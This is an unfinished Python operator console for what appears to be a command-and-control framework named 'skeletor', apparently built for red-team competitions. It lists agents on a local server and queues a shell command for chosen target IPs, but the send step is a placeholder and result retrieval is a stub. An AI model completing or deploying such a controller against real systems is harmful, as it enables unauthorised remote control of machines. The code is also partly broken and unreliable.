#!/usr/bin/env python3

import requests, json

URL = "http://127.0.0.1:80"

def skeletor_banner():
    try:
        with open("banner.txt", "r",encoding='utf-8') as f:
            banner = f.read()
            print(banner)
    except FileNotFoundError:
        pass


def menu():
    print("1. Get Agent Status")
    print("2. Issue a Command")
    print("3. Get Result from Agent")    
    print("4. Exit")

def exit_manager():
    print("Exiting...")
    exit(0)

def get_agent_status():
    try:
        agents = requests.get(URL + "/get-agents").json()
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return 
    if agents:
        for agent in agents:
            print(f"Agent ID: {agent['agent_id']}")
            print(f"Agent Status: {agent['status']}")
            
def send_cmd():
    requests.post(URL + "/clear-targets")
    command = input("Command: ")
    if command.strip() == "":
        print("Command cannot be empty.")
        return
    targets = input("Command Targets (comma separated) (Use * for all): ")
    if targets == "*":
        targets = []
        for agent in requests.get(URL + "/get-agents").json():
            targets.append(agent['agent_id'])
        requests.post(URL + "/set-targets", json={"ips": targets})
    else:
        targets = targets.strip().split(",")
        if "x" in targets:
            x_val = input("Number of teams: ")
            targets = targets.replace("x", x_val)
            print(f"Targets: {targets}")
            confirm = input("Confirm (y/n): ")
            if confirm.lower() != "y" and confirm.lower() != "yes":
                print("Command not sent.")
                return
            targets = targets.strip().split(",")
            requests.post(URL + "/set-targets", json={"ips": targets})
        else:
            pass
    requests.post() # FINISH THIS LINE
    requests.post(URL + "/clear-targets")

def get_result():
    pass

def main():
    skeletor_banner()
    while True:
        menu()
        userin = input(": ").strip()
        options = {
            "1": get_agent_status,
            "2": send_cmd,
            "3": get_result,
            "4": exit_manager,
        }
        if userin in options:
            options[userin]()
        else:
            print("Invalid option. Please try again.")
        

if __name__ == "__main__":
    main()